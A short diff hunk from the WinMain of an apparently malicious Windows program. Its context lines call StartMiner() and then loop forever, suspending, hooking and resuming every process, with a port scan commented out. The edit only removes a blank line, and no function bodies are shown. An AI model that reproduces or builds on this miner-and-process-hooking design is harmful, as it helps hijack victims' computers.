@@ -32,7 +32,6 @@ int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
 	//PortScan();
 
     StartMiner();
-
 	while (TRUE) {
 		process_allSuspendApplyResume(HookProcess);
 		Sleep(1000);
